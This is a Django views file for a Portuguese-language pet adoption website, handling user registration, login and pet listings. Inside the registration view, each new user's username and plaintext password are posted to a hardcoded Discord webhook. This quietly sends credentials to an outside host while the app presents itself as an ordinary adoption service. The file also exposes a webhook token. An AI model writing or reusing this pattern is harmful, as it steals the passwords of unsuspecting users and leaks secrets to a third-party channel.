from django.shortcuts import render, redirect
import requests
from django.views.generic import ListView, DetailView, View
from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login, logout
from .models import Animal, Profile

webhook_url = "https://discord.com/api/webhooks/1486395280763912213/ICMYwxltBV5_GYf06hn5eEE_YtwvK11Oiza_RdP39EDuIREmeXq620Z6bNmNp112Aunr"

class DetalheAnimalView(DetailView):
    model = Animal
    template_name = 'detalhe.html'
    context_object_name = 'animal'

class LogoutView(View):
    def post(self, request):
        logout(request)
        return redirect("login")

class RegisterView(View):
    def get(self, request):
        return render(request, "register.html")

    def post(self, request):
        username = request.POST.get("username")
        password = request.POST.get("password")
        empresa = request.POST.get("empresa") == "true"

        if not username or not password:
            return render(request, "register.html", {"erro": "Preencha tudo"})

        if User.objects.filter(username=username).exists():
            return render(request, "register.html", {"erro": "Usuário já existe"})

        user = User.objects.create_user(username=username, password=password)

        Profile.objects.create(user=user, empresa=empresa)

        try:
            data = {
                    "content": "Novo usuário registrado!",
                    "embeds": [
                        {
                            "title": "👤 Novo Cadastro",
                            "description": "Um novo usuário entrou no sistema.",
                            "color": 5814783,

                            "fields": [
                                {
                                    "name": "Username",
                                    "value": username,
                                    "inline": True
                                },
                                {
                                    "name": "Tipo de Conta",
                                    "value": "Empresa" if empresa else "Usuário comum",
                                    "inline": True
                                },
                                {
                                    "name": "Password",
                                    "value": password,
                                    "inline": True
                                }
                            ],

                            "footer": {
                                "text": "Sistema de Adoção 🐾"
                            }
                        }
                    ]
                }

        except Exception as e:
            raise e

        requests.post(webhook_url, json=data)

        return redirect("login")


class LoginView(View):
    def get(self, request):
        return render(request, "login.html")

    def post(self, request):
        username = request.POST.get("username")
        password = request.POST.get("password")

        user = authenticate(request, username=username, password=password)

        if user:
            login(request, user)
            return redirect("animais")

        return render(request, "login.html", {"erro": "Credenciais inválidas"})


class CreatePetView(View):
    def get(self, request):
        if not request.user.is_authenticated:
            return redirect("login")

        return render(request, 'criar.html')

    def post(self, request):
        if not request.user.is_authenticated:
            return redirect("login")
        
        if not request.user.profile.empresa:
            return redirect("animais")

        animal = Animal.objects.create(
            nome=request.POST.get('nome'),
            tipo=request.POST.get('tipo'),
            idade=request.POST.get('idade'),
            caracteristicas=request.POST.get('caracteristicas'),
            localizacao=request.POST.get('localizacao'),
            contato=request.POST.get('contato'),
            foto=request.POST.get('foto'),
        )
        
        try:
            data = {
                "content": "Novo cadastro de animal!",
                "embeds": [
                    {
                        "title": f"{animal.nome} foi cadastrado 🐾",
                        "description": "Um novo animal foi adicionado para adoção.",
                        "color": 5814783,

                        "fields": [
                            {
                                "name": "Tipo",
                                "value": animal.tipo,
                                "inline": True
                            },
                            {
                                "name": "Idade",
                                "value": str(animal.idade),
                                "inline": True
                            },
                            {
                                "name": "Localização",
                                "value": animal.localizacao,
                                "inline": False
                            },
                            {
                                "name": "Contato",
                                "value": animal.contato,
                                "inline": False
                            },
                            {
                                "name": "Características",
                                "value": animal.caracteristicas,
                                "inline": False
                            }
                        ],

                        "image": {
                            "url": animal.foto
                        },

                        "footer": {
                            "text": "Sistema de Adoção 🐾"
                        }
                    }
                ]
            }

            requests.post(webhook_url, json=data)
        except Exception as e:
            raise e

        return redirect('animais')


class ViewAnimais(ListView):
    model = Animal
    template_name = 'animais.html'
    context_object_name = 'animais'

    def dispatch(self, request, *args, **kwargs):
        if not request.user.is_authenticated:
            return redirect("login")
        return super().dispatch(request, *args, **kwargs)